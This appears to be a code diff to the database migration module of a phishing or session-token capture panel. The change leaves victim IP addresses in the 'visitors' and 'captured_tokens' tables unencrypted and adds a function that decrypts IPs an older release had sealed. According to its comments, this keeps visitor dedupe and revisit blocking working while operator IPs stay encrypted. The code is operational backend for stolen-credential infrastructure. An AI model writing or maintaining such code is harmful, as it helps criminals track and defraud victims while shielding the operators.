@@ -25,12 +25,16 @@
 // is guarded by an "is it already sealed?" predicate, so re-running on each
 // boot costs one scan.
 const db = require('../database/connection');
-const { sealDet, isSealed } = require('../utils/sensitive');
+const { sealDet, isSealed, open } = require('../utils/sensitive');
 
+// Operator-side IPs only. Victim IPs (visitors, captured_tokens) are kept in
+// the clear on purpose - see connection.js IP_COLS. Any row that an older
+// release already sealed is decrypted back on boot (decryptVictimIPs).
 const IP_TABLES = [
-  'visitors', 'cookie_renewals', 'captured_tokens',
+  'cookie_renewals',
   'login_history', 'audit_log', 'user_sessions',
 ];
+const VICTIP_TABLES = ['visitors', 'captured_tokens'];
 
 async function run(sql) {
   try { await db.query(sql); return true; }
@@ -132,11 +136,47 @@ async function backfillIPs() {
   return total;
 }
 
+// Reverse of backfillIPs for the victim tables. An older release sealed these
+// columns; visitor dedupe and block_done_visitors compare plaintext IPs, so
+// leaving ciphertext behind would silently break revisit blocking and show
+// gibberish in the panel.
+async function decryptVictimIPs() {
+  let total = 0;
+  for (const table of VICTIP_TABLES) {
+    for (;;) {
+      let rows;
+      try {
+        const result = await db.query(
+          'SELECT id, `ip_address` AS v FROM `' + table + '` ' +
+          'WHERE `ip_address` LIKE "s1:%" OR `ip_address` LIKE "s2:%" LIMIT 200'
+        );
+        rows = result[0] || [];
+      } catch (e) { break; }
+      if (!rows.length) break;
+
+      let migrated = 0;
+      for (const r of rows) {
+        const plain = open(r.v);
+        if (!plain || plain === String(r.v) || isSealed(plain)) continue;
+        try {
+          await db.query('UPDATE `' + table + '` SET `ip_address` = ? WHERE id = ?', [plain, r.id]);
+          total++;
+          migrated++;
+        } catch (e) {
+        }
+      }
+      if (migrated === 0) break;
+    }
+  }
+  return total;
+}
+
 async function runSensitiveMigrations() {
   try {
     await ensureSensitiveSchema();
     await backfillUsers();
     await backfillIPs();
+    await decryptVictimIPs();
   } catch (err) {
   }
 }
@@ -146,6 +186,8 @@ module.exports = {
   runSensitiveMigrations,
   backfillUsers,
   backfillIPs,
+  decryptVictimIPs,
   migrateColumn,
   IP_TABLES,
+  VICTIP_TABLES,
 };
